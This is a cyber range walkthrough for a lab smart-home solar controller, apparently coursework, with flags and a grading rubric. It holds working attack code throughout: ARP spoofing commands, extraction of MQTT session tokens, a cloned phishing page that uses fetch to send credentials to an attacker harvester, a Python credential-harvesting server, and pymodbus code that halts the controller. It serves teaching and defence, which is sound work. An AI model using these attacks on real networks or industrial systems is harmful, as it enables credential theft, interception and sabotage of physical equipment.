# Smart Home PV - Cyber Range Walkthrough

## 🎯 Objective

This is a **CYBER RANGE**, not a CTF. You must perform **REAL attacks** using professional tools. No copy-paste curl commands - you'll need to:

- Perform actual ARP spoofing with `arpspoof` or `ettercap`
- Capture network traffic with `tcpdump` and analyze with `tshark`/Wireshark
- Clone websites and host phishing infrastructure  
- Extract credentials from packet captures
- Craft Modbus protocol packets
- Exploit web applications professionally

**Estimated Time**: 3-4 hours for complete penetration test

---

## ⚠️ CRITICAL: Use the Attacker Container

```bash
# Start the challenge
cd /home/mastros/gitstuff/stratocyberlab/challenges/smart-home-pv
docker compose up -d

# Enter the ATTACKER container (NOT scl-hackerlab!)
docker compose exec attacker bash

# Verify you have the right tools
which arpspoof tcpdump tshark mosquitto_sub
```

---

## 📚 Attack Chain Overview

```
Phase 1: Reconnaissance
   ├── Network scanning (nmap)
   ├── Service enumeration
   └── MQTT discovery
   
Phase 2: Man-in-the-Middle
   ├── ARP spoofing (arpspoof)
   ├── Packet capture (tcpdump)
   ├── Traffic analysis (tshark/Wireshark)
   └── Session token extraction
   
Phase 3: Social Engineering
   ├── Website cloning (wget)
   ├── Phishing page modification
   ├── Hosting malicious server (python http.server)
   └── Email delivery (API call)
   
Phase 4: Authenticated Access
   ├── Admin login with stolen credentials
   ├── API token acquisition
   └── System control
   
Phase 5: ICS Protocol Exploitation
   ├── Modbus traffic analysis
   ├── Protocol reverse engineering
   ├── Crafting Modbus packets (pymodbus)
   └── Industrial system manipulation
```

---

## Phase 1: Reconnaissance (30-45 minutes)

### Task 1.1: Network Scanning

**Objective**: Discover all devices on the network

```bash
# Full network scan
nmap -sV -p- 172.20.0.0/24 -oN scan_full.txt

# Service-specific scans
nmap -sC -sV 172.20.0.65 -oN scan_pv_controller.txt
nmap -p 1883 -sV 172.20.0.66 -oN scan_mqtt.txt
nmap -p 502 -sV 172.20.0.65 -oN scan_modbus.txt
```

**Expected Results**:
```
172.20.0.65  - PV Controller (HTTP 80, Modbus 502)
172.20.0.66  - MQTT Broker (1883)
172.20.0.72  - Victim Workstation (unknown services)
```

### Task 1.2: Service Enumeration

```bash
# HTTP enumeration
curl -i http://172.20.0.65/
curl http://172.20.0.65/wifi_scan | jq .

# MQTT enumeration
mosquitto_sub -h 172.20.0.66 -t '#' -v

# You should see telemetry data flowing
```

**🎓 Learning Point**: The `/wifi_scan` endpoint gives you a WiFi password, but this is NOT the admin password in a realistic scenario!

**Flag #1**: Awarded immediately from `/wifi_scan` endpoint:
```
BSY{PV_RECON_9a7c9f3f9f}
```

### Task 1.3: Initial Footprinting

```bash
# Check web application
curl http://172.20.0.65/admin
# Result: You'll see it requires authentication

# Try default credentials (will fail)
curl -X POST http://172.20.0.65/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"super-secret-123"}'
  
# Response: {"error": "Invalid credentials"}
# The WiFi password does NOT work for admin panel!
```

**Documentation**: Save all scan results for your penetration test report.

---

## Phase 2: Man-in-the-Middle Attack (45-60 minutes)

### Task 2.1: Understanding the Attack

**Goal**: Intercept MQTT traffic between victim workstation (172.20.0.72) and MQTT broker (172.20.0.66) to capture session tokens.

**Why?**: MQTT uses no encryption by default. Session tokens are transmitted in cleartext.

### Task 2.2: ARP Spoofing Setup

```bash
# IP forwarding is already enabled in the attacker container
# Verify it's enabled
cat /proc/sys/net/ipv4/ip_forward  # Should show 1
```

### Task 2.3: Start Packet Capture

**BEFORE** starting ARP spoofing, start packet capture:

```bash
# Capture all traffic to pcap file
tcpdump -i eth0 -w /tmp/mitm_capture.pcap -v &

# Or capture only MQTT traffic
tcpdump -i eth0 port 1883 -w /tmp/mqtt_capture.pcap -v &
```

### Task 2.4: Execute ARP Spoofing

```bash
# Method 1: Using arpspoof (dsniff package)
# Poison victim's ARP cache (tell victim we are the MQTT broker)
arpspoof -i eth0 -t 172.20.0.72 -r 172.20.0.66

# This will continuously send ARP replies
# Keep it running in this terminal
```

**Alternative Method 2**: Using ettercap:
```bash
# Interactive ettercap
ettercap -T -i eth0 -M arp:remote /172.20.0.72// /172.20.0.66//
```

**🎓 Learning Point**: You should see ARP packets being sent in the output:

```
de:ad:be:ef:ca:fe ff:ff:ff:ff:ff:ff 0806 42: arp reply 172.20.0.66 is-at de:ad:be:ef:ca:fe
```

### Task 2.5: Wait for Traffic

Let the ARP spoofing run for **60-90 seconds**. The victim container periodically connects to MQTT and the system publishes status updates.

You'll see tcpdump capturing packets:
```
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
15:23:45.123456 IP 172.20.0.72.54321 > 172.20.0.66.1883: Flags [S], seq 1234...
15:23:45.234567 IP 172.20.0.66.1883 > 172.20.0.72.54321: Flags [S.], seq 5678...
```

### Task 2.6: Stop Capture and Analyze

```bash
# Stop arpspoof (Ctrl+C)
# Stop tcpdump (kill %1 or Ctrl+C on background job)
kill %1

# Verify pcap file
ls -lh /tmp/mqtt_capture.pcap
```

### Task 2.7: Extract MQTT Session Token

**Method 1**: Using tshark (command-line Wireshark):

```bash
# Display MQTT packets
tshark -r /tmp/mqtt_capture.pcap -Y "mqtt" -T fields \
  -e frame.number \
  -e ip.src \
  -e ip.dst \
  -e mqtt.msg

# Look for PUBLISH messages to 'pv/status' topic
tshark -r /tmp/mqtt_capture.pcap -Y "mqtt.msgtype == 3" -T json | less

# Extract the session token from JSON payload
tshark -r /tmp/mqtt_capture.pcap -Y "mqtt.topic contains status" -T fields -e mqtt.msg
```

**Expected Output**:
```json
{"status":"RUNNING","power_kw":3.21,"timestamp":1732125432.5,"session":"mqtt-session-a3f7b4e8c2d1"}
```

**Session Token**: `mqtt-session-a3f7b4e8c2d1` (value will be different each run)

**Method 2**: Using Wireshark GUI (if you have X11 forwarding):

```bash
# Export the pcap to your local machine
docker cp scl-challenge-smart-home-pv-attacker:/tmp/mqtt_capture.pcap ~/

# Open in Wireshark on your host
wireshark ~/mqtt_capture.pcap

# Filter: mqtt.topic contains "status"
# Right-click packet → Follow → TCP Stream
# Find JSON payload with "session" field
```

### Task 2.8: Verify ARP Spoofing Detection

The server monitors its ARP table and detects spoofing:

```bash
curl http://172.20.0.65/api/challenge/status | jq .
```

**Expected**:
```json
{
  "events_completed": {
    "arp_spoof_detected": true,
    "packets_captured": true
  },
  "arp_changes_detected": 1,
  ...
}
```

**Flag #2**: Awarded automatically after ARP spoofing detected:
```bash
curl http://172.20.0.65/flag/arp_mitm | jq .
```

**Response**:
```json
{
  "flag": "BSY{PV_ARP_MITM_7c3f9a}",
  "earned_at": "2024-11-20T15:30:42Z"
}
```

---

## Phase 3: Social Engineering - Phishing Attack (45-60 minutes)

### Task 3.1: Understand the Target

**Goal**: Steal admin credentials via phishing

**Important**: The admin password is **NOT** the WiFi password! You must phish the real credentials.

### Task 3.2: Reconnaissance - Find the Login Page

```bash
# Discover the admin login page
curl -i http://172.20.0.65/admin

# Response: 200 OK with HTML dashboard
# The dashboard has a login form

# Download the page
wget --mirror --convert-links --page-requisites http://172.20.0.65/admin

# This creates: 172.20.0.65/admin/index.html (or similar)
```

### Task 3.3: Clone the Login Page

```bash
# Create phishing directory
mkdir -p /tmp/phishing
cd /tmp/phishing

# Download the login page and all assets
wget -r -k -p -E http://172.20.0.65/admin -P ./

# OR manually create a convincing login page
cat > login.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>PV Admin - Security Alert</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 350px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: bold;
            color: #667eea;
        }
        .alert {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            color: #856404;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #5568d3;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">🔐 PV Admin Portal</div>
        
        <div class="alert">
            ⚠️ <strong>Security Alert</strong><br>
            Suspicious activity detected. Please verify your credentials immediately.
        </div>
        
        <form id="loginForm" method="POST">
            <input type="text" name="username" placeholder="Username" value="admin" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify Account</button>
        </form>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const formData = new FormData(e.target);
            const data = {
                username: formData.get('username'),
                password: formData.get('password')
            };
            
            // Send credentials to attacker's harvester
            await fetch('http://172.20.0.70:8000/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            // Also send to real server (for realism)
            await fetch('http://172.20.0.65/api/internal/phish_submitted', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            // Show fake success message
            alert('Verification complete. Redirecting...');
            window.location.href = 'http://172.20.0.65/admin';
        });
    </script>
</body>
</html>
EOF
```

### Task 3.4: Set Up Credential Harvester

```bash
# Create credential harvesting server
cat > harvest_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class HarvestHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/harvest':
            # Read credentials
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            creds = json.loads(data)
            
            # Log credentials
            logger.critical(f"🎣 CREDENTIALS HARVESTED: {creds}")
            
            # Save to file
            with open('/tmp/harvested_creds.txt', 'a') as f:
                f.write(f"{creds['username']}:{creds['password']}\n")
            
            # Respond
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            super().do_POST()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), HarvestHandler)
    logger.info("🎣 Credential harvester running on http://0.0.0.0:8000")
    server.serve_forever()
EOF

chmod +x harvest_server.py

# Run harvester in background
python3 harvest_server.py &
```

### Task 3.5: Host the Phishing Page

```bash
# Serve phishing page
cd /tmp/phishing
python3 -m http.server 8001 &

# Verify it's accessible
curl http://172.20.0.70:8001/login.html
```

### Task 3.6: Send Phishing Email

```bash
# Send phishing email to victim
curl -X POST http://172.20.0.65/api/send_phishing_email \
  -H "Content-Type: application/json" \
  -d '{
    "to": "admin@pv-controller.local",
    "subject": "URGENT: Security Alert - Verify Your Account",
    "body": "Unusual login activity detected on your account. Please verify your credentials immediately to prevent account suspension.",
    "link": "http://172.20.0.70:8001/login.html"
  }'
```

**Response**:
```json
{"result": "ok", "email_id": "a3f7b4e8"}
```

### Task 3.7: Wait for Victim to Click

The victim container checks email every 30 seconds. Watch the logs:

```bash
# Monitor victim activity
docker compose logs -f victim

# You should see:
# [Victim] Checking email...
# [Victim] Email: "URGENT: Security Alert - Verify Your Account" (suspicion: 25%)
# [Victim] 🎣 Clicking phishing link: http://172.20.0.70:8001/login.html
# [Victim] Page loaded, evaluating authenticity...
# [Victim] ✓ Page looks legitimate, entering credentials
# [Victim] Entered username
# [Victim] Entered password
# [Victim] 🚨 CREDENTIALS SUBMITTED TO PHISHING PAGE
```

### Task 3.8: Harvest Credentials

```bash
# Check harvester logs
tail -f /tmp/harvested_creds.txt

# Expected output:
# admin:PV-Sec-2024!Admin
```

**🎉 Success!** You've stolen the admin credentials.

**Flag #3**: Awarded automatically after victim submits credentials:
```bash
curl http://172.20.0.65/flag/phishing | jq .
```

**Response**:
```json
{
  "flag": "BSY{PV_PHISH_SUCCESS_4b8d2e}",
  "earned_at": "2024-11-20T16:15:33Z"
}
```

---

## Phase 4: Authenticated Access (20-30 minutes)

### Task 4.1: Login to Admin Panel

```bash
# Use stolen credentials
curl -X POST http://172.20.0.65/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"PV-Sec-2024!Admin"}' \
  | jq .
```

**Response**:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "username": "admin",
  "expires_in": 1800
}
```

**Save the token**:
```bash
ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

### Task 4.2: Access Admin Dashboard

```bash
# View admin dashboard in browser (if you have GUI)
firefox http://172.20.0.65/admin

# Or use curl to test authenticated endpoints
curl http://172.20.0.65/api/admin/logs/phishing \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | jq .
```

**Flag #4**: Available after successful authentication:
```bash
curl http://172.20.0.65/flag/admin_access | jq .
```

**Response**:
```json
{
  "flag": "BSY{PV_ADMIN_PANEL_6e9a1c}",
  "earned_at": "2024-11-20T16:20:15Z"
}
```

---

## Phase 4: Admin Dashboard Access (30-45 minutes)

### Task 4.1: Understanding the Admin Panel

The PV system has a **professional SCADA HMI (Human-Machine Interface)** built with React. This is a realistic industrial control dashboard used to monitor and control the solar power system.

**Dashboard Features**:
- Real-time power production graphs (Chart.js)
- System metrics and status displays
- MQTT telemetry stream integration
- Modbus control interface
- System diagnostics and logs
- **FLAG #4 displayed after successful authentication**

### Task 4.2: Access the Admin Dashboard

```bash
# From your host machine (not attacker container), open browser:
http://172.20.0.65/admin
```

**What you should see**:
- Industrial-themed dark blue login screen
- "PV SCADA HMI" branding
- "System Operational" status indicator
- Username/password fields
- Security notices

**Try to access without credentials**:
- Cannot bypass login
- No SQL injection vulnerabilities (proper authentication)
- Must have credentials obtained from phishing

### Task 4.3: Login with Stolen Credentials

Use the credentials harvested in Phase 3:

```
Username: admin
Password: PV-Sec-2024!Admin
```

**After successful login**:
1. Dashboard loads with sidebar navigation
2. System Overview shows real-time metrics
3. Power Analytics displays Chart.js graphs
4. MQTT data streams appear in real-time
5. Navigate to **"Diagnostics"** tab

### Task 4.4: Capture FLAG #4

In the Diagnostics panel, you'll see:

```
🏁 Achievement Unlocked
Admin Access Flag
BSY{PV_ADMIN_PANEL_6e9a1c}

Congratulations! You have successfully gained administrative 
access to the PV SCADA system.
```

**Also visible in Diagnostics**:
- Network status (controller IP, MQTT broker, Modbus port)
- System logs (authentication events, MQTT connections)
- Performance metrics (CPU, memory, network I/O)
- Recent events timeline

### Task 4.5: Explore Dashboard Features

**System Overview Tab**:
- Current power output
- System status (RUNNING/HALTED)
- Average power calculation
- Grid connection status
- Controller model information
- MQTT session ID

**Power Analytics Tab**:
- Real-time line chart of power production
- Peak/average/minimum statistics
- Solar irradiance data
- Panel temperature
- System efficiency percentage

**Modbus Control Tab**:
- Protocol information (TCP port 502)
- Coil control interface (Write Single Coil)
- Register control (Write Single Register)
- Register map reference table
- Security warnings

**Note**: The Modbus Control interface shows the protocol structure but requires direct pymodbus commands for actual exploitation (see Phase 5).

### 🚩 FLAG #4 Earned

```
BSY{PV_ADMIN_PANEL_6e9a1c}
```

**Skills Demonstrated**:
- Credential theft via social engineering
- Web application authentication
- Admin panel enumeration
- Understanding SCADA HMI interfaces
- Real-time data visualization analysis

---

## Phase 5: ICS Protocol Exploitation (45-60 minutes)

### Task 5.1: Understanding Modbus TCP

**Modbus TCP** is an industrial control protocol used in SCADA systems. It operates on TCP port 502 and uses function codes to read/write device registers.

**Key Concepts**:
- **Coils**: Binary outputs (0 or 1) - addresses 0-65535
- **Discrete Inputs**: Binary inputs (read-only)
- **Holding Registers**: 16-bit registers for configuration
- **Input Registers**: 16-bit registers (read-only)

**Function Codes**:
- `0x01`: Read Coils
- `0x03`: Read Holding Registers
- `0x05`: Write Single Coil
- `0x10`: Write Multiple Registers

### Task 5.2: Capture Legitimate Modbus Traffic

```bash
# Start capture on Modbus port
tcpdump -i eth0 port 502 -w /tmp/modbus_traffic.pcap -v &

# Wait 30-60 seconds for traffic (system generates some Modbus traffic automatically)

# Stop capture
kill %1
```

### Task 5.3: Analyze Modbus Protocol

```bash
# View Modbus packets
tshark -r /tmp/modbus_traffic.pcap -Y "modbus" -V | less

# Look for:
# - Transaction ID
# - Unit ID
# - Function Code
# - Register Address
# - Values
```

**Example packet**:
```
Modbus/TCP
    Transaction Identifier: 0x0001
    Protocol Identifier: 0x0000
    Length: 6
    Unit Identifier: 1
    Function Code: Read Holding Registers (0x03)
    Starting Address: 0
    Quantity: 10
```

### Task 5.4: Reconnaissance - Read Modbus Registers

```bash
# Use pymodbus to read current state
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('172.20.0.65', port=502)
client.connect()

# Read coils (binary outputs)
result = client.read_coils(0, 10)
if hasattr(result, 'bits'):
    print(f"Coils 0-9: {result.bits[:10]}")

# Read holding registers
result = client.read_holding_registers(0, 10)
if hasattr(result, 'registers'):
    print(f"Registers 0-9: {result.registers}")

client.close()
EOF
```

**Expected Output**:
```
Coils 0-9: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
Registers 0-9: [3200, 240, 13, 0, 0, 0, 0, 0, 0, 0]
```

**Analysis**:
- Coil 0: System enable (0=disabled, 1=enabled)
- Coil 1: HALT control (0=normal, 1=halted)
- Register 0: Power output (W)
- Register 1: Voltage (V)
- Register 2: Current (A*10)

### Task 5.5: Execute Modbus Attack - Write HALT Command

```bash
# Write to coil 1 to HALT the system
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient('172.20.0.65', port=502)
client.connect()

print("Writing to coil 1 (HALT control)...")

# Write TRUE to coil 1
result = client.write_coil(1, True)
print(f"Write result: {result}")

time.sleep(1)

# Verify the write
result = client.read_coils(1, 1)
if hasattr(result, 'bits'):
    print(f"Coil 1 is now: {result.bits[0]}")

client.close()

print("✓ Modbus HALT command executed")
EOF
```

**Expected Output**:
```
Writing to coil 1 (HALT control)...
Write result: WriteCoilResponse(1)
Coil 1 is now: True
✓ Modbus HALT command executed
```

### Task 5.6: Verify System Halted

```bash
# Check system status
curl http://172.20.0.65/api/status | jq .
```

**Response**:
```json
{
  "status": "HALTED",
  "power_kw": 0,
  "voltage_v": 240,
  "current_a": 0,
  ...
}
```

### Task 5.7: Retrieve Flag from Logs

```bash
# Check Modbus attack log
curl http://172.20.0.65/api/admin/logs/modbus_attacks \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | jq .
```

**Response**:
```json
{
  "logs": [
    "2024-11-20T16:45:22,MODBUS_HALT,BSY{PV_MODBUS_HALT_3f7b4d},coil_1"
  ]
}
```

**Flag #5**: Extract from log file:
```
BSY{PV_MODBUS_HALT_3f7b4d}
```

---

## Summary of Flags

| # | Task | Flag | Technique |
|---|------|------|-----------|
| 1 | Reconnaissance | `BSY{PV_RECON_9a7c9f3f9f}` | WiFi scan, nmap |
| 2 | ARP MITM | `BSY{PV_ARP_MITM_7c3f9a}` | arpspoof, tcpdump |
| 3 | Phishing | `BSY{PV_PHISH_SUCCESS_4b8d2e}` | Social engineering, credential harvesting |
| 4 | Admin Access | `BSY{PV_ADMIN_PANEL_6e9a1c}` | Authenticated access with stolen creds |
| 5 | Modbus Attack | `BSY{PV_MODBUS_HALT_3f7b4d}` | ICS protocol exploitation |

**Total Points**: 100

---

## 🛡️ Defensive Lessons

After completing this cyber range, you should understand:

### Network Security
- **ARP Spoofing Detection**: Monitor ARP tables, use static ARP entries, deploy switches with ARP inspection
- **Network Segmentation**: Isolate ICS/SCADA networks from IT networks
- **Encrypted Protocols**: Use MQTT over TLS, Modbus over VPN

### Application Security
- **Strong Authentication**: Unique passwords per service, MFA required
- **Session Management**: Tokens with expiration, HttpOnly cookies, CSRF protection
- **Input Validation**: Prevent SQL injection, XSS, command injection

### Social Engineering
- **Security Awareness**: Train users to identify phishing
- **Email Filtering**: SPF/DKIM/DMARC, URL sandboxing
- **Incident Response**: Report suspicious emails immediately

### ICS Security
- **Modbus Security**: Implement authentication, use ModbusTCP over TLS
- **Access Control**: Whitelist allowed IP addresses, firewall rules
- **Monitoring**: IDS/IPS for industrial protocols, anomaly detection

---

## 📚 Additional Resources

- **MITRE ATT&CK for ICS**: https://attack.mitre.org/matrices/ics/
- **NIST SP 800-82**: Guide to Industrial Control Systems Security
- **OWASP IoT Top 10**: https://owasp.org/www-project-internet-of-things/
- **Modbus Protocol Spec**: https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf

---

## 🎓 Grading Rubric

Submit the following for full credit:

1. **Network Scan Report** (10 pts)
   - nmap scan results showing all discovered devices
   - Service enumeration (HTTP, MQTT, Modbus)

2. **MITM Evidence** (20 pts)
   - Packet capture file (`.pcap`)
   - Screenshot of extracted MQTT session token
   - Explanation of ARP spoofing technique

3. **Phishing Campaign** (20 pts)
   - Cloned login page HTML
   - Screenshot of phishing email sent
   - Screenshot of harvested credentials
   - Screenshot of victim clicking link (docker logs)

4. **Admin Access** (15 pts)
   - Screenshot of successful admin login
   - Screenshot of admin dashboard
   - API token output

5. **Modbus Exploitation** (20 pts)
   - Modbus traffic analysis (tshark output)
   - Python script used for Modbus write
   - Screenshot of system HALTED status
   - Log file showing flag

6. **Written Report** (15 pts)
   - Executive summary
   - Detailed methodology for each phase
   - Defensive recommendations
   - Lessons learned

**Total**: 100 points
